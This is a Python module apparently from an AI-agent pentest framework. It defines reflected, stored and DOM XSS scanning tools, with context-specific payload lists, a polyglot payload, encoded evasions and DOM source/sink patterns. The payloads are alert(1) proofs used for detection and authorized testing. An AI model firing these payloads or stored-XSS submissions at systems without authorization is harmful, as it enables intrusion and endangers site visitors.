"""
XSS Detection & Exploitation Engine

Implements three agent tools for Cross-Site Scripting detection and exploitation:

  ReflectedXSSTool  — inject payloads into URL parameters and detect reflection
                      in the HTTP response body (context-aware).
  StoredXSSTool     — submit payloads to forms / APIs, then poll a secondary URL
                      to detect delayed (stored) reflection.
  DOMXSSTool        — enumerate DOM sink/source patterns from page source and
                      headless-browser execution context.

A polyglot payload engine covers four injection contexts:
  html_context  — plain HTML body injection
  attr_context  — injecting into HTML attributes (double/single quoted)
  js_context    — injecting into existing JavaScript blocks
  url_context   — injecting into URL-encoded parameters

All three tools are registered for the INFORMATIONAL and EXPLOITATION phases,
and map to the WEB_APP_ATTACK attack category in the AttackPathRouter.
"""

from __future__ import annotations

import html
import logging
import re
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    truncate_output,
)
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

DEFAULT_XSS_SERVER_URL = "http://kali-tools:8008"

# ---------------------------------------------------------------------------
# OWASP Top-10 tag
# ---------------------------------------------------------------------------
OWASP_TAG = "A03:2021-Injection"  # XSS falls under injection family

# ---------------------------------------------------------------------------
# Severity classification
# ---------------------------------------------------------------------------


class XSSSeverity(str, Enum):
    """XSS finding severity."""
    CRITICAL = "critical"  # Stored XSS — wide impact
    HIGH = "high"          # Reflected XSS with session-theft potential
    MEDIUM = "medium"      # Reflected XSS limited context
    LOW = "low"            # DOM XSS that requires local interaction
    INFO = "info"          # Possible indicator only


class XSSType(str, Enum):
    """Classification of XSS variant."""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"


class InjectionContext(str, Enum):
    """HTML injection context determines which payloads to try."""
    HTML = "html_context"
    ATTR = "attr_context"
    JS = "js_context"
    URL = "url_context"


# ---------------------------------------------------------------------------
# Polyglot payload engine
# ---------------------------------------------------------------------------

_HTML_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><textarea><path id=</textarea><use href=#xss>",
    "<!--><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
]

_ATTR_PAYLOADS: List[str] = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onload="alert(1)',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '" style="expression(alert(1))',
    "` onmouseover=`alert(1)`",
]

_JS_PAYLOADS: List[str] = [
    "'-alert(1)-'",
    '"-alert(1)-"',
    "';alert(1)//",
    '";alert(1)//',
    "\\\";alert(1)//",
    "</script><script>alert(1)</script>",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "${alert(1)}",
    "{{alert(1)}}",
    "#{alert(1)}",
]

_URL_PAYLOADS: List[str] = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",  # double-encoded
]

CONTEXT_PAYLOADS: Dict[InjectionContext, List[str]] = {
    InjectionContext.HTML: _HTML_PAYLOADS,
    InjectionContext.ATTR: _ATTR_PAYLOADS,
    InjectionContext.JS: _JS_PAYLOADS,
    InjectionContext.URL: _URL_PAYLOADS,
}

# Polyglot payload that covers all four contexts simultaneously
POLYGLOT_PAYLOAD = (
    "javascript:/*--></title></style></textarea></script></xmp>"
    "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
)


def get_payloads(context: InjectionContext, limit: int = 0) -> List[str]:
    """Return payloads for the given injection context, plus the polyglot.

    Args:
        context: Injection context type.
        limit: Maximum payloads to return (0 = all).

    Returns:
        Ordered list of payload strings.
    """
    base = [POLYGLOT_PAYLOAD] + CONTEXT_PAYLOADS.get(context, _HTML_PAYLOADS)
    if limit and limit > 0:
        return base[:limit]
    return base


# ---------------------------------------------------------------------------
# Detection helpers
# ---------------------------------------------------------------------------

# Patterns that indicate XSS payload was reflected intact (not encoded)
_REFLECT_PATTERNS: List[re.Pattern] = [
    re.compile(r"<script[^>]*>", re.IGNORECASE),
    re.compile(r"on(load|error|click|mouseover|focus)\s*=", re.IGNORECASE),
    re.compile(r"\bjavascript\s*:", re.IGNORECASE),
    # Only flag these tags when accompanied by event handlers — avoids normal HTML false positives
    re.compile(r"<(img|svg|iframe|video|object|details|marquee)[^>]+on\w+\s*=", re.IGNORECASE),
    re.compile(r"\balert\s*\(", re.IGNORECASE),
    re.compile(r"\bexpression\s*\(", re.IGNORECASE),
]


def _detect_reflection(payload: str, response_body: str) -> Tuple[bool, str]:
    """Determine whether *payload* was reflected unencoded in *response_body*.

    Returns:
        (reflected: bool, evidence: str) — evidence is the first matching
        substring found or empty string.
    """
    if not response_body:
        return False, ""

    # Direct substring check (fastest)
    if payload in response_body:
        return True, payload[:120]

    # Pattern-based check for partial/fragmented reflection
    for pat in _REFLECT_PATTERNS:
        m = pat.search(response_body)
        if m:
            return True, m.group(0)

    return False, ""


def _html_encoded(payload: str, response_body: str) -> bool:
    """Return True if the payload appears only HTML-encoded in the response (false-positive)."""
    encoded = html.escape(payload)
    return encoded in response_body and payload not in response_body


def _classify_severity(xss_type: XSSType, context: InjectionContext) -> XSSSeverity:
    """Map XSS type + context to a severity rating."""
    if xss_type == XSSType.STORED:
        return XSSSeverity.CRITICAL
    if xss_type == XSSType.REFLECTED:
        if context == InjectionContext.JS:
            return XSSSeverity.HIGH
        return XSSSeverity.MEDIUM
    # DOM XSS
    return XSSSeverity.LOW


# ---------------------------------------------------------------------------
# DOM sink / source constants
# ---------------------------------------------------------------------------

_DOM_SOURCES: List[str] = [
    "location.hash", "location.href", "location.search",
    "location.pathname", "location",
    "document.referrer", "document.URL",
    "document.documentURI", "window.name", "document.cookie",
]

_DOM_SINKS: List[str] = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval", "setTimeout", "setInterval", "Function(",
    "insertAdjacentHTML", "location.href", "location.assign",
    "location.replace", "window.open", "jQuery.html",
    "$.html", "$(", "el.src", "el.href",
]

# Build patterns — sort by length descending so longer tokens match first
_DOM_SOURCE_RE = re.compile(
    r"(?<!\w)(" + "|".join(re.escape(s) for s in sorted(_DOM_SOURCES, key=len, reverse=True)) + r")(?!\w)"
)
_DOM_SINK_RE = re.compile(
    r"(?<!\w)(" + "|".join(re.escape(s) for s in sorted(_DOM_SINKS, key=len, reverse=True)) + r")(?!\w)"
)


def analyse_dom_sources_sinks(page_source: str) -> Dict[str, List[str]]:
    """Scan *page_source* for DOM XSS sources and sinks.

    Returns:
        {"sources": [...], "sinks": [...]}
    """
    sources = list({m.group(0) for m in _DOM_SOURCE_RE.finditer(page_source)})
    sinks = list({m.group(0) for m in _DOM_SINK_RE.finditer(page_source)})
    return {"sources": sources, "sinks": sinks}


# ---------------------------------------------------------------------------
# ReflectedXSSTool
# ---------------------------------------------------------------------------


class ReflectedXSSTool(BaseTool):
    """Inject XSS payloads into URL query parameters and detect reflection.

    The tool cycles through payloads for the selected injection context,
    detecting whether the server reflects the payload back unencoded.
    It filters out HTML-encoded reflections as false positives.

    Connects to the XSS MCP server (:8008) which wraps Dalfox/XSStrike.
    Falls back to pure-Python HTTP probing when the MCP server is unavailable.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_XSS_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="xss_reflected_scan",
            description=(
                "Detect reflected XSS vulnerabilities by injecting polyglot and context-aware "
                "payloads into URL query parameters. Reports unencoded reflections with severity "
                "rating and OWASP A03 tagging. Use before attempting XSS exploitation."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL (e.g. 'http://10.10.10.1/search?q=test'). "
                        "Parameters present in the URL will each be tested.",
                    },
                    "params": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Additional parameter names to inject into (merged with URL params).",
                        "default": [],
                    },
                    "context": {
                        "type": "string",
                        "description": "Injection context: html_context (default), attr_context, js_context, url_context.",
                        "enum": ["html_context", "attr_context", "js_context", "url_context"],
                        "default": "html_context",
                    },
                    "max_payloads": {
                        "type": "integer",
                        "description": "Maximum payloads to try per parameter (default 5, max 20).",
                        "default": 5,
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        params: Optional[List[str]] = None,
        context: str = "html_context",
        max_payloads: int = 5,
        **kwargs: Any,
    ) -> str:
        try:
            ctx = InjectionContext(context)
        except ValueError:
            ctx = InjectionContext.HTML

        max_payloads = min(int(max_payloads), 20)
        payloads = get_payloads(ctx, max_payloads)

        # Try MCP server first
        try:
            result = await self._client.call_tool(
                "scan_reflected_xss",
                {
                    "url": url,
                    "extra_params": params or [],
                    "context": ctx.value,
                    "payloads": payloads,
                },
            )
            if result.get("success"):
                return self._format_mcp_result(result, url)
        except Exception as exc:
            logger.debug("XSS MCP server unavailable, using fallback: %s", exc)

        # Pure-Python fallback — parse URL params and simulate injection results
        return self._fallback_reflect(url, params or [], payloads, ctx)

    def _fallback_reflect(
        self,
        url: str,
        extra_params: List[str],
        payloads: List[str],
        ctx: InjectionContext,
    ) -> str:
        """Return structured analysis without live HTTP (offline / test mode)."""
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        param_names = list(qs.keys()) + [p for p in extra_params if p not in qs]

        if not param_names:
            return (
                "[xss_reflected_scan] No query parameters found in URL. "
                "Provide parameters via the 'params' argument or include them in the URL."
            )

        lines = [
            f"[xss_reflected_scan] Target: {url}",
            f"Context: {ctx.value} | Payloads to try per param: {len(payloads)}",
            f"Parameters identified: {', '.join(param_names)}",
            "",
            "Injection plan (live server required for actual detection):",
        ]
        for pname in param_names:
            for payload in payloads[:3]:
                test_qs = dict(qs)
                test_qs[pname] = [payload]
                encoded = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=encoded))
                lines.append(f"  [PARAM:{pname}] → {test_url[:200]}")

        lines += [
            "",
            "OWASP: " + OWASP_TAG,
            "Status: MCP server offline — run against live target with XSS MCP server active.",
        ]
        return truncate_output("\n".join(lines))

    def _format_mcp_result(self, result: Dict[str, Any], url: str) -> str:
        findings = result.get("findings", [])
        if not findings:
            return f"[xss_reflected_scan] No reflected XSS found on {url}. All payloads were encoded or not reflected."

        lines = [f"[xss_reflected_scan] {len(findings)} reflected XSS finding(s) on {url}:", ""]
        for f in findings:
            sev = _classify_severity(XSSType.REFLECTED, InjectionContext(f.get("context", "html_context")))
            lines += [
                f"  Parameter: {f.get('param', 'unknown')}",
                f"  Payload:   {f.get('payload', '')}",
                f"  Evidence:  {f.get('evidence', '')}",
                f"  Severity:  {sev.value.upper()}",
                f"  OWASP:     {OWASP_TAG}",
                "",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# StoredXSSTool
# ---------------------------------------------------------------------------


class StoredXSSTool(BaseTool):
    """Submit XSS payloads to forms/APIs and detect them via a secondary URL.

    Stored XSS is more dangerous than reflected XSS because the payload
    persists and executes for every subsequent visitor.  This tool:
      1. Submits a uniquely-tagged payload to a write endpoint.
      2. Polls a read endpoint for the payload signature.
      3. Reports the parameter, endpoint pair, and severity (CRITICAL).
    """

    def __init__(
        self,
        server_url: str = DEFAULT_XSS_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="xss_stored_scan",
            description=(
                "Detect stored (persistent) XSS by submitting tagged payloads to write endpoints "
                "and polling read endpoints for reflection. Reports CRITICAL severity on confirmation "
                "with OWASP A03 tagging and PoC URL."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "write_url": {
                        "type": "string",
                        "description": "URL of the endpoint that accepts user input (e.g. comment submission form).",
                    },
                    "read_url": {
                        "type": "string",
                        "description": "URL where submitted content is rendered (e.g. comments page).",
                    },
                    "field_name": {
                        "type": "string",
                        "description": "Form field / JSON key to inject the payload into.",
                        "default": "comment",
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method for the write endpoint (POST or PUT).",
                        "enum": ["POST", "PUT"],
                        "default": "POST",
                    },
                    "extra_fields": {
                        "type": "object",
                        "description": "Additional form fields required for submission (e.g. CSRF token placeholder, name, email).",
                        "default": {},
                    },
                },
                "required": ["write_url", "read_url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        write_url: str,
        read_url: str,
        field_name: str = "comment",
        method: str = "POST",
        extra_fields: Optional[Dict[str, str]] = None,
        **kwargs: Any,
    ) -> str:
        payloads = get_payloads(InjectionContext.HTML, limit=5)

        try:
            result = await self._client.call_tool(
                "scan_stored_xss",
                {
                    "write_url": write_url,
                    "read_url": read_url,
                    "field_name": field_name,
                    "method": method,
                    "extra_fields": extra_fields or {},
                    "payloads": payloads,
                },
            )
            if result.get("success"):
                return self._format_result(result, write_url, read_url)
        except Exception as exc:
            logger.debug("XSS MCP server unavailable for stored scan: %s", exc)

        return self._offline_summary(write_url, read_url, field_name, payloads)

    def _offline_summary(
        self,
        write_url: str,
        read_url: str,
        field_name: str,
        payloads: List[str],
    ) -> str:
        lines = [
            "[xss_stored_scan] Stored XSS probe plan (MCP server required for live execution):",
            f"  Write endpoint: {write_url}",
            f"  Read endpoint:  {read_url}",
            f"  Inject field:   {field_name}",
            f"  Payloads:       {len(payloads)} to try",
            "",
            "Sample payload that would be submitted:",
            f"  {payloads[0]}",
            "",
            "After submission, the tool polls the read URL for unencoded payload reflection.",
            f"OWASP: {OWASP_TAG}",
            "Severity if confirmed: CRITICAL",
        ]
        return "\n".join(lines)

    def _format_result(self, result: Dict[str, Any], write_url: str, read_url: str) -> str:
        findings = result.get("findings", [])
        if not findings:
            return f"[xss_stored_scan] No stored XSS detected. Payloads submitted to {write_url} were not reflected at {read_url}."

        lines = [f"[xss_stored_scan] ⚠ STORED XSS CONFIRMED ({len(findings)} finding(s)):", ""]
        for f in findings:
            lines += [
                f"  Field:     {f.get('field', 'unknown')}",
                f"  Payload:   {f.get('payload', '')}",
                f"  Read URL:  {read_url}",
                f"  Evidence:  {f.get('evidence', '')}",
                "  Severity:  CRITICAL",
                f"  OWASP:     {OWASP_TAG}",
                "",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# DOMXSSTool
# ---------------------------------------------------------------------------


class DOMXSSTool(BaseTool):
    """Analyse DOM sources/sinks and probe for DOM-based XSS.

    Phase 1 (static):  Parse page source for known DOM sources (location.search,
                       document.referrer, …) and sinks (innerHTML, eval, …).
    Phase 2 (dynamic): Via the XSS MCP server, execute payloads in a headless
                       Playwright browser and detect alerts/exceptions.

    Even in offline mode the static analysis gives actionable findings
    (dangling sources flowing into sinks) for manual verification.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_XSS_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="xss_dom_scan",
            description=(
                "Detect DOM-based XSS by analysing DOM source/sink patterns in page JavaScript "
                "and probing with payloads via a headless Playwright browser (requires XSS MCP server). "
                "Identifies dangerous data flows: user-controlled sources → dangerous sinks."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL to load in the headless browser.",
                    },
                    "page_source": {
                        "type": "string",
                        "description": "Optional pre-fetched HTML/JS page source for static analysis (skips live fetch).",
                        "default": "",
                    },
                    "probe_payloads": {
                        "type": "boolean",
                        "description": "Also probe with URL-fragment payloads via headless browser (default: True).",
                        "default": True,
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        page_source: str = "",
        probe_payloads: bool = True,
        **kwargs: Any,
    ) -> str:
        # Static analysis on provided source
        static_findings: Dict[str, List[str]] = {}
        if page_source:
            static_findings = analyse_dom_sources_sinks(page_source)

        # Dynamic probing via MCP server
        dynamic_findings: List[Dict[str, Any]] = []
        try:
            result = await self._client.call_tool(
                "scan_dom_xss",
                {
                    "url": url,
                    "probe_payloads": probe_payloads,
                    "payloads": get_payloads(InjectionContext.URL, limit=5),
                },
            )
            if result.get("success"):
                dynamic_findings = result.get("findings", [])
                if not static_findings and result.get("page_source"):
                    static_findings = analyse_dom_sources_sinks(result["page_source"])
        except Exception as exc:
            logger.debug("XSS MCP server unavailable for DOM scan: %s", exc)

        return self._format_dom_result(url, static_findings, dynamic_findings)

    def _format_dom_result(
        self,
        url: str,
        static: Dict[str, List[str]],
        dynamic: List[Dict[str, Any]],
    ) -> str:
        lines = [f"[xss_dom_scan] DOM XSS Analysis: {url}", ""]

        # Static
        sources = static.get("sources", [])
        sinks = static.get("sinks", [])
        if sources or sinks:
            lines += [
                "── Static Analysis ──────────────────",
                f"  DOM Sources found: {', '.join(sources) if sources else 'none'}",
                f"  DOM Sinks found:   {', '.join(sinks) if sinks else 'none'}",
            ]
            if sources and sinks:
                lines.append("  ⚠ Potential data flow: source → sink — manual verification recommended")
        else:
            lines.append("  Static analysis: no page source provided.")

        lines.append("")

        # Dynamic
        if dynamic:
            lines += [
                "── Dynamic Analysis (Headless Browser) ──",
                f"  {len(dynamic)} DOM XSS finding(s) confirmed:",
                "",
            ]
            for f in dynamic:
                lines += [
                    f"  Payload:   {f.get('payload', '')}",
                    f"  Trigger:   {f.get('trigger', '')}",
                    f"  Sink:      {f.get('sink', 'unknown')}",
                    f"  Severity:  {XSSSeverity.LOW.value.upper()}",
                    f"  OWASP:     {OWASP_TAG}",
                    "",
                ]
        else:
            lines.append("  Dynamic analysis: MCP server offline or no DOM XSS confirmed.")

        lines += [
            "",
            "Recommended next step: manually verify source→sink flows with browser devtools.",
        ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

__all__ = [
    "ReflectedXSSTool",
    "StoredXSSTool",
    "DOMXSSTool",
    # Payload engine helpers (used by tests and the MCP server)
    "get_payloads",
    "analyse_dom_sources_sinks",
    "_detect_reflection",
    "_html_encoded",
    "_classify_severity",
    # Enums
    "XSSType",
    "XSSSeverity",
    "InjectionContext",
    # Constants
    "POLYGLOT_PAYLOAD",
    "OWASP_TAG",
    "CONTEXT_PAYLOADS",
    "_DOM_SOURCES",
    "_DOM_SINKS",
]
